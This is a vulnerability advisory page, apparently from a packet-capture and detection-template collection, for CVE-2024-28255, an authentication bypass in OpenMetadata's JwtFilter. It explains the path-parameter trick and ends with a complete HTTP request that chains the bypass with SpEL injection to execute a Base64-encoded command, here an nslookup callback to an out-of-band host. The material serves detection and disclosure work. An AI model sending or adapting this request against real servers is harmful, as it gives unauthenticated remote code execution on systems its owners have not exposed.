---
layout: post
cve_id: CVE-2024-28255
title: OpenMetadata - Authentication Bypass
pcap: true
pcap_path: /pcaps/2024/CVE-2024-28255.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2024/CVE-2024-28255.yaml
snort2_rule: N/A
snort3_rule: N/A
author: DhiyaneshDK,iamnooob
severity: critical
impact: 'Unauthenticated attackers can bypass authentication and gain unauthorized
  access to the OpenMetadata platform and its resources.

  '
remediation: 'Update OpenMetadata to a version that patches CVE-2024-28255.

  '
reference:
- https://github.com/open-metadata/OpenMetadata/blob/e2043a3f31312ebb42391d6c93a67584d798de52/openmetadata-service/src/main/java/org/openmetadata/service/security/JwtFilter.java#L111
- https://github.com/open-metadata/OpenMetadata/blob/e2043a3f31312ebb42391d6c93a67584d798de52/openmetadata-service/src/main/java/org/openmetadata/service/security/JwtFilter.java#L113
- https://github.com/open-metadata/OpenMetadata/security/advisories/GHSA-6wx7-qw5p-wh84
- https://nvd.nist.gov/vuln/detail/CVE-2024-28255
- https://github.com/wy876/wiki
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
  cvss-score: 9.8
  cve-id: CVE-2024-28255
  cwe-id: CWE-287
  epss-score: 0.93995
  epss-percentile: 0.99884
metadata:
  verified: true
  max-request: 1
  shodan-query: http.favicon.hash:733091897
tags:
- cve
- cve2024
- openmetadata
- rce
- auth-bypass
- vkev
- vuln
---

## üîç Vulnerability Description
OpenMetadata is a unified platform for discovery, observability, and governance powered by a central metadata repository, in-depth lineage, and seamless team collaboration. The `JwtFilter` handles the API authentication by requiring and verifying JWT tokens. When a new request comes in, the request's path is checked against this list. When the request's path contains any of the excluded endpoints the filter returns without validating the JWT. Unfortunately, an attacker may use Path Parameters to make any path contain any arbitrary strings. For example, a request to `GET /api/v1;v1%2fusers%2flogin/events/subscriptions/validation/condition/111` will match the excluded endpoint condition and therefore will be processed with no JWT validation allowing an attacker to bypass the authentication mechanism and reach any arbitrary endpoint, including the ones listed above that lead to arbitrary SpEL expression injection. This bypass will not work when the endpoint uses the `SecurityContext.getUserPrincipal()` since it will return `null` and will throw an NPE. This issue may lead to authentication bypass and has been addressed in version 1.2.4. Users are advised to upgrade. There are no known workarounds for this vulnerability. This issue is also tracked as `GHSL-2023-237`.


## üåê HTTP Request
```nohighlight
GET /api/v1;v1%2fusers%2flogin/events/subscriptions/validation/condition/T(java.lang.Runtime).getRuntime().exec(new%20java.lang.String(T(java.util.Base64).getDecoder().decode(%22bnNsb29rdXAgZDVpcHVwaGxlMG80ZTAzZTZrMmc5ZTRub3JmbTMxY3BjLm9hc3QucHJv%22))) HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0
Connection: close
Accept-Encoding: gzip
```

